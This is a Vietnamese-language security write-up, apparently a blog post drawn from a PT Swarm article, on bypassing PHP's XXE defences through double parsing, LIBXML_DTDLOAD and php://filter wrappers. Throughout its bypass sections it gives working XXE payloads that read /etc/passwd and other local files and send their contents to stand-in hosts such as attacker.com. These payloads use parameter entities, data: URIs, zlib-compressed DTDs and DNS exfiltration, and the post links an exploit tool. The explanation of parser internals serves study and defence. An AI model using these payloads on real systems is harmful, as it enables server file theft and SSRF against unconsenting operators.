# Impossible XXE in PHP

## Tổng quan về XML
### Tổng quan

![image.png](https://images.viblo.asia/3593e0bf-bea1-47a0-9e1f-c9cb596a7c5a.png)

XML là viết tắt của **eXtensible Markup Language**,được phát triển với mục đích lưu trữ và vận chuyển dữ liệu.
Ngôn ngữ được lập trình dựa trên cơ sơ `Standard Generalized Markup Language (SGML)` 
Phiên bản XML phổ biến nhất là  XML 1.0
### Xử lý XML trong ứng dụng:
![](https://cdn.discordapp.com/attachments/1302520723104862309/1302521254971965481/image.png?ex=67f0cef2&is=67ef7d72&hm=b7739eb8a1253a4cf0f8de67c675367e32c90faac508d5438e454ad70fa8ec12&=)
![](http://note.bksec.vn/pad/uploads/ac366565-f4c5-4f26-bd43-1ee3f8a90d87.png)

Ví dụ 1 file XML: 
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<user>
  <name>Tan3ora</name>
  <email>tan3ora@example.com</email>
  <role>Pentester</role>
</user>
```
### Document Type Definition (DTD)  
DTD là 1 thành phần trong XML Document :
 - Mở rộng chức năng cho XML Document 
 - Sử dụng để định nghĩa Entities trong XML Documents 
 - DTD phải tuân thủ theo cấu trúc và Syntax của một XML Documents
 
Entity (thực thể) là các biến được sử dụng để định nghĩa shortcuts các ký tự hoặc đoạn ký tự đặc biệt. Một entity có cấu trúc gồm 3 phần: Ký tự  `&` , tên entity, ký tự  `;` . Chúng được khai báo trong DTD.
Entity có thể được khai báo bằng hai dạng:
- Internal Entity : được khai báo và sử dụng trong cùng một file, cú pháp `<!ENTITY entity-name "entity-value">`
- External Entity : được khai báo ở địa chỉ khác, khi sử dụng hệ thống sẽ truy xuất tới các địa chỉ đó để lấy dữ liệu entities, cú pháp `<!ENTITY entity-name SYSTEM "URI/URL">`

 Khi có nhiều file XML cùng format, hoặc data lặp đi lặp lại → người ta xài DTD để định nghĩa sẵn cấu trúc + mấy biến dùng chung (ENTITY), đỡ phải viết lại mỗi lần.

DTD phải xuất hiện ở phần bắt đầu của tài liệu XML 
Để xem nó như là External DTD,thuộc tính standalone trong khai báo XML phải được thiết lập là `no`.Nghĩa là khai báo thông tin từ nguồn bên ngoài.
Ví dụ: 
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE address SYSTEM "address.dtd">
<address>
  <name>&address;</name>
</address>
```
Chú ý: XML khi dùng các ký tự đặc biệt sẽ vi phạm Syntax,muốn dử dụng thì phải encode.
## XML External Entity Injection (XXE)
![image.png](https://images.viblo.asia/2537a2df-8d47-442c-ae83-187aa802e263.png)

**Root cause:** Injection vào External Entity.
💥 Nếu `XML parser` cho phép khai báo DTD và không chặn xử lý external entity thì có thể khai thác được XXE.
1 số kịch bản có thể xảy ra:
+ Information disclosure
+ Include internal resource
+ Include external resource
+ Perform external requests (SSRF)
+ Remote code execution

Ví dụ: Rò rỉ thông tin nội bộ:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```
### **Những chức năng nào hay xảy ra lỗi XXE Injection** 
- Chữ "`x`" trong đuôi file `.docx` , `.pptx` , `.xlsx` có nghĩa là XML. Nếu ứng dụng xử lý những file này đều có nguy cơ bị XXE.
- Giao tiếp API có sử dụng XML thay vì JSON hoặc Parameter Query String 
- Ứng dụng cho phép Upload và  Xử lý tệp tin XML (SVG cũng là 1 loại XML)

### ❌ Vậy để **chống XXE** ở PHP thì làm sao?
Khi parse XML bằng `DOMDocument` :

🚫 Bật `LIBXML_NONET` ( *Chặn truy cập network (http, ftp, file...) trong ENTITY* )
→ -   Không cho tải external entity qua HTTP/FTP và chặn SSRF, OOB, hoặc đẩy dữ liệu qua `http://attacker.com`

🚫 Không bật `LIBXML_DTDLOAD` 
→ Nếu không có flag này thì parser sẽ **bỏ qua DTD luôn**, ENTITY sẽ không được khai báo.

🚫 Không bật `LIBXML_NOENT` 
→ Nếu có flag này thì sẽ cho phép parser thay thế các ENTITY như `&xxe;` bằng nội dung thật, chính là nguyên nhân gây ra XXE.

**Chú ý**: Nếu parser KHÔNG bật `LIBXML_DTDLOAD` → **toang luôn XXE**, vì không inject được ENTITY từ DTD.

## Impossible XXE in PHP
Ví dụ đoạn code "tạm an toàn" :
```xml
<?php  
	ini_set('display_errors', '0');  // Tắt hiển thị lỗi
	$doc = new  \DOMDocument(); 
	$doc->loadXML($_POST['user_input']); // #1 Parse XML input từ user 
	$xml = $doc->saveXML(); // Serialize lại XML ra string
	$doc = new  \DOMDocument('1.0', 'UTF-8'); 
	
	$doc->loadXML($xml, LIBXML_DTDLOAD | LIBXML_NONET); // #2 + #3 Parse lại với 2 flag
	foreach ($doc->childNodes as  $child) { 
		if ($child->nodeType === XML_DOCUMENT_TYPE_NODE) { // #4 Nếu có DOCTYPE thì chặn luôn
			throw  new  RuntimeException('Dangerous XML detected'); 
		} 
	} 
?>
```
### Phân tích code:
#### **#1 – `loadXML($_POST['user_input'])`**
 ❗ **Trước PHP 8.0**, khi không bật `LIBXML_NOENT`, thì ENTITY sẽ không được parse, mà chỉ giữ nguyên dạng `&xxe;`.  
=> **ENTITY không hoạt động luôn**, vô hiệu hóa basic XXE như `&xxe;`.

#### **#2 – `LIBXML_DTDLOAD` cho phép load DTD nội bộ hoặc external**
Nhưng **không cho phép nested entity** (ENTITY trong ENTITY) như payload này:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval SYSTEM "<!ENTITY &#x25; exf SYSTEM 'http://evil.com/?%data;'>">
%eval;
%exf;
```
❗ Sẽ bị **warning** nhưng không thực thi — vì **thiếu `LIBXML_NOENT` hoặc `LIBXML_DTDVALID`**, nên ENTITY sẽ **không được mở rộng hay chèn vào nhau.**

#### #3 – `LIBXML_NONET`
✅ **Chặn mọi kết nối mạng** ,nên không thể dùng `SYSTEM "http://evil.com"` để đẩy dữ liệu ra ngoài `(OOB XXE, SSRF...)`  
→ Mọi external entity trỏ ra HTTP đều fail.
#### #4 – Chặn `<!DOCTYPE>`
 `XML_DOCUMENT_TYPE_NODE` là node kiểu DOCTYPE → tức là nếu có `<!DOCTYPE>` thì nó detect và chặn luôn.
→ Vì **mọi payload XXE đều cần DTD**, nên cách này giống như firewall chặn từ vòng gửi xe 🚫

Đoạn code trên tạm an toàn đến khi gặp payload này:
![](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/c5a75364-img_1.png)

### Bypass,bypass và bypass
**PHP tưởng đã fix XXE rồi, nhưng thực ra vẫn có lỗ hổng nếu dev:**
-   Parse XML 2 lần    
-   Dùng `LIBXML_DTDLOAD` (cho phép tải DTD)
-   Và tưởng `LIBXML_NONET` sẽ chặn network

#### 1. Bypass điều kiện `<!DOCTYPE`
Bypass `<!DOCTYPE` condition là bước đơn giản nhất.
Dù code có chặn `DOCTYPE`, nếu dùng **parameter entity (`%xxe;`)**, thì payload vẫn có thể **được thực thi sớm**, **ngay trong lúc gọi `loadXML()`**, trước khi code kịp check kiểu node do **Parameter Entity (`%xxe;`) là loại đặc biệt**, nó được xử lý **ngay khi parser đọc DTD**.
Tóm lại: Check `nodeType === XML_DOCUMENT_TYPE_NODE` là quá muộn. Nếu payload dùng Parameter Entity (`%xxe;`), nó sẽ thực thi NGAY lúc gọi `loadXML()` – check gì cũng vô nghĩa sau đó.

#### 2. Bypass `LIBXML_NONET`
Khi bật flag `LIBXML_NONET` ,nếu URI bắt đầu bằng `http://` , parser sẽ không tải external entity để tránh XXE/SSRF.
```C
// parserInternals.c

static xmlParserInputPtr
xmlDefaultExternalEntityLoader(const char *url, const char *ID,
                               xmlParserCtxtPtr ctxt)
{
    …
    // `LIBXML_NONET` flag in PHP, is the same as `XML_PARSE_NONET` flag in libxml2
    if ((ctxt != NULL) && (ctxt->options & XML_PARSE_NONET) && 
        // no-net "protection":
        (xmlStrncasecmp(BAD_CAST url, BAD_CAST "http://", 7) == 0)) { // [1]
        
        xmlCtxtErrIO(ctxt, XML_IO_NETWORK_ATTEMPT, url);
    } else {
        input = xmlNewInputFromFile(ctxt, url);
    }
    …
}
```
Tuy nhiên PHP không dùng hàm mặc định `xmlDefaultExternalEntityLoader()` mà dùng `xmlParserInputBufferCreateFilenameDefault(php_libxml_input_buffer_create_filename); ` để override cách libxml2 mở file/entity.
```c
// ext/libxml/libxml

// sets custom handler implementation
xmlParserInputBufferCreateFilenameDefault(php_libxml_input_buffer_create_filename); 

static xmlParserInputBufferPtr
php_libxml_input_buffer_create_filename(const char *URI, xmlCharEncoding enc)
{
    …
	context = php_libxml_streams_IO_open_read_wrapper(URI);
    …
    ret = xmlAllocParserInputBuffer(enc);
	if (ret != NULL) {
		ret->context = context;
		ret->readcallback = php_libxml_streams_IO_read;
		ret->closecallback = php_libxml_streams_IO_close;
	}

	return(ret);
}

static void *php_libxml_streams_IO_open_read_wrapper(const char *filename)
{
	return php_libxml_streams_IO_open_wrapper(filename, "rb", 1);
}


static void *php_libxml_streams_IO_open_wrapper(const char *filename, const char *mode, const int read_only)
{
    …
	} else {
		resolved_path = (char *)filename;
	}
    …
	php_stream_wrapper *wrapper = php_stream_locate_url_wrapper(resolved_path, &path_to_open, 0);
    …
	php_stream *ret_val = php_stream_open_wrapper_ex(path_to_open, mode, REPORT_ERRORS, NULL, context); // [3]
    …
	return ret_val;
}
```
Tức là: PHP thay đổi cách load file/entity, dùng hệ thống riêng gọi là stream wrapper (`php://`, `file://`, `data://`, v.v)

⚠️ Vấn đề phát sinh là gì? 
- libxml2 chỉ chặn URL bắt đầu bằng `http://` hoặc `ftp://`
- NHƯNG nếu bọc HTTP trong wrapper như `php://filter/...` theo kiểu: `php://filter/resource=http://evil.com/evil.dtd`, libxml2 không nhận ra đây là HTTP, nên PHP vẫn gửi request như bình thường. 

#### 3. Bypass `loadXML($_POST['user_input'])`
##### 🧠 Vấn đề gốc: tại sao payload XXE không hoạt động?
Ví dụ:
```xml
<!DOCTYPE x [
  <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
  %xxe;
]>
<x></x>
```
Khi qua dòng `$doc->loadXML($payload);` PHP KHÔNG thực thi dòng `%xxe;` ngay lập tức, vì:
- Không bật `LIBXML_DTDLOAD` nên DTD không được load
- Không bật `LIBXML_NOENT` nên ENTITY không được resolve
- Và đặc biệt khi  gọi `saveXML()` sau đó → PHP chỉ lưu phần DTD chính thức thôi, còn phần nội dung như `%xxe;` (ENTITY sử dụng) thì bị lược bỏ.

Cụ thể khi chạy:
```php
$payload = '<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">%xxe;]><x></x>';

$doc->loadXML($payload);
$xml = $doc->saveXML();
```
`$xml` chỉ còn:
```xml
<!DOCTYPE x [
  <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
]>
<x></x>
```
Dòng `&xxe;` đã bị mất → Không có gì gọi external DTD → payload fail

##### ✅ Giải pháp
Phân tích cách `libxml2` xử lý khai báo DTD:
```C
// parserInternals.c

int
xmlParseDocument(xmlParserCtxtPtr ctxt) {
    ...
    if (CMP9(CUR_PTR, '<', '!', 'D', 'O', 'C', 'T', 'Y', 'P', 'E')) {
	    ctxt->inSubset = 1;
	    xmlParseDocTypeDecl(ctxt);
        ...
        if ((ctxt->sax != NULL) && (ctxt->sax->externalSubset != NULL) &&
	        (!ctxt->disableSAX))
	        ctxt->sax->externalSubset(ctxt->userData, ctxt->intSubName,
	                                  ctxt->extSubSystem, ctxt->extSubURI);

        }
    ...

void
xmlParseDocTypeDecl(xmlParserCtxtPtr ctxt) {
    ...
    URI = xmlParseExternalID(ctxt, &ExternalID, 1); 
    ...
    ctxt->extSubURI = URI;
    ctxt->extSubSystem = ExternalID;
    ...
}   
```
Khi parser đọc đến dòng bắt đầu bằng `<!DOCTYPE`, nó gọi hàm `xmlParseDocTypeDecl()` để xử lý phần khai báo DTD.

Nếu DOCTYPE có SYSTEM URI (ví dụ: `http://evil.com/malicious.dtd`), nó sẽ lưu lại đường dẫn này vào biến `ctxt->extSubURI`.

Lúc này URI đã được lưu vào context `ctxt` → Dù chưa cho load ngay, URI vẫn nằm đó chờ sẵn 
→ nó sẽ luôn được gọi nếu `LIBXML_DTDLOAD` bật.

Khi đó chỉ cần chỉnh payload thành :
```xml
 <!DOCTYPE x SYSTEM "http://attacker.com/malicious.dtd" []><x></x>
```

### Làm sao để đẩy data ra ngoài ???
Tính đến hiện tại, ta đã bypass thành công 3 tầng bảo vệ và tải được external DTD từ bất kỳ nguồn nào.
Giờ là lúc giải quyết bài toán exfil dữ liệu (đẩy dữ liệu ra ngoài).

#### 🧾 Cách thông thường: 
Thông thường khi muốn đẩy data ra ngoài,attacker thường host 1 trang web public có chứa một external DTD file có URL `http://attacker.com/malicious.dtd` có nội dung như sau:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Tệp tin DTD này thực hiện các bước hoạt động như sau:

- Định nghĩa một parameter entity với tên `file` có giá trị là nội dung tệp `/etc/passwd`
- Định nghĩa một entity với tên `eval`, trong entity này chứa một định nghĩa parameter entity khác với tên `exfiltrate` sẽ gửi request tới website của attacker `http://attacker.com/`, truyền tham số x chứa nội dung tệp `/etc/passwd` bằng cách gọi tham chiếu entity `%file;`
- Gọi tham chiếu entity `%eval` chứa định nghĩa entity `exfiltrate`
- Gọi tham chiếu entity `%exfiltrate;`

Cuối cùng, attacker định nghĩa một parameter entity, gửi payload tới server chứa lỗ hổng XXE :
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://attacker.com/malicious.dtd"> %xxe;]>
```

#### 🔥 Vấn đề:
Tuy nhiên nếu áp dụng cách này ở đây thì payload trên sẽ không hoạt động do các parameter entity dạng `SYSTEM` (external) chỉ được load khi có:
- `LIBXML_NOENT` (thay thế entity)
- hoặc `LIBXML_DTDVALID` (validation XML)

Nếu không có thì Parser không load nội dung của `%file;` → `%eval;` tạo ra entity bị rỗng → `%exfiltrate;` không hoạt động 😑

#### ✅ Cách giải quyết (bypass):

1. 💡 Dùng entity nội bộ (internal):
```xml
<!ENTITY % file "somedata">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
→ Vì `%file;` có nội dung cụ thể ("`somedata`") 
→ `%eval;` sinh ra entity hợp lệ

→ `%exfiltrate;` gửi request ra ngoài với `?x=somedata`
→ Thành công 

2. 💡 Dùng file local có nội dung hợp lệ:
```xml
<!ENTITY % file SYSTEM "file:///tmp/some.txt">
<!ENTITY % data %file;>
<!ENTITY % payload '<!ENTITY &#37; exf SYSTEM "http://attacker.com/?x=%data;">'>
%payload;
%exf;
```
→ File `/tmp/some.txt` phải chứa: `"It+works!"`
→ Vì parser chỉ xử lý nếu nội dung:
- Được bao trong dấu `"` hoặc `'`
- Không chứa ký tự cấm như `&`, `\0`, v.v.

### BRO PHP filters chain
Đến bước này rồi,để leak được data ra ta chỉ cần:
1. Loại bỏ các ký tự không hợp lệ : Convert nội dung sang `base64`
2. Thêm dấu `"` vào đầu và cuối nội dung file : Giải quyết dễ dàng bằng wrapper `php://filter:`

Payload hoàn thiện:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/A-LOT-OF-WRAPWRAP-FILTERS/resource=/tmp/secret.txt">
<!ENTITY % data %file;>
<!ENTITY % payload '<!ENTITY &#37; exf SYSTEM "http://attacker.com/?x=%data;">'>
%payload;
%exf;
```
Chú ý: `A-LOT-OF-WRAPWRAP-FILTERS` là lặp lại nhiều lần  filter `convert.base64-encode` (~ 20 lần)

### lightyear chunks
Nhưng có một vấn đề: vì wrapwrap phải dùng rất nhiều filter, nên file càng lớn thì payload cũng càng to.Thậm chí có thể lên đến hàng chục KB chỉ để đọc vài dòng dữ liệu.

Khi parser đọc `SYSTEM` "uri", nó sẽ check độ dài.
Nếu không bật `XML_PARSE_HUGE`, thì giới hạn độ dài URL chỉ là 50 KB.

Với `lightyear dechunk`, ta có thể chia nhỏ file thành nhiều phần, mỗi chunk đọc từng tí.

Payload cực nhỏ, không cần wrapwrap dài → file lớn vẫn exfil được!

![alt text](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/6c59e220-Comapare2.png)

### Làm gì khi server bị chặn kết nối TCP ra ngoài
Trong một số trường hợp, server chặn toàn bộ kết nối TCP outbound
→ khiến ta không thể tải DTD từ server tấn công. → XXE thông thường fail hoàn toàn

Giải pháp:

Dùng data: URI (tự nhúng nội dung vào chính XML) thay vì tải file từ xa
→ Dữ liệu rò rỉ ra ngoài qua DNS subdomain (ví dụ: `data-leak.attacker.com`)

Protocol `data:`
PHP hỗ trợ wrapper `data:` → cho phép ta nhúng nội dung DTD ngay trong XML, không cần truy cập ra ngoài:
```xml
<!DOCTYPE x SYSTEM 'data:,<!ENTITY % file SYSTEM "php://filter/.../resource=/etc/passwd">
<!ENTITY % data %file;>
<!ENTITY % exf SYSTEM "http://web-attacker.com/?x=%data;">'>
```
→ Đây là cách nhét toàn bộ DTD payload vào chính XML, không cần tải từ server
Nhưng vì có quá nhiều filter, payload rất dài → khó inject qua GET

→ Xử lý vấn đề độ dài bằng zlib:
- Vì filter lặp nhiều → có thể nén rất tốt.
→ Dùng `zlib.deflate` rồi base64 để nén DTD lại trước khi dùng.
`php://filter/zlib.deflate/convert.base64-encode/resource=/payload.dtd`

Payload: 
```xml
<!DOCTYPE x SYSTEM "php://filter/convert.base64-decode/zlib.inflate/resource=data:BASE64_ZLIB_DATA," []><x></x>
```

Dữ liệu được gửi qua DNS request → kẻ tấn công log lại tên miền truy cập để thu thập file
![alt text](image-1.png)

⚠️ Lưu ý:
- Mỗi phần giữa dấu . không được dài hơn 63 ký tự
- DNS như Google có thể đổi A → a, cần check lại base64

Final Payload:

🧱 Phần DOCTYPE chính
```xml
<!DOCTYPE x SYSTEM "php://filter/convert.base64-decode/zlib.inflate/resource=data:,[ZLIB_ENCODED_DTD]" []>
```

🧱 Nội dung bên trong DTD (sau khi giải nén):
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/[wrapwrap_filters]/dechunk/resource=/etc/passwd">
<!ENTITY % exf %data;>
<!ENTITY % payload '<!ENTITY &#37; e SYSTEM "php://filter/resource=http://attacker.com?exf=%exf;">'>
%payload;
%e;
```
![alt text](https://swarm.ptsecurity.com/wp-content/uploads/2025/03/c5a75364-img_1.png)

## Tool exploit 
[Link](https://github.com/bytehope/wwe)

## ✅ References
https://swarm.ptsecurity.com/impossible-xxe-in-php/

https://viblo.asia/p/xxe-injection-vulnerabilities-lo-hong-xml-phan-1-vlZL992BLQK
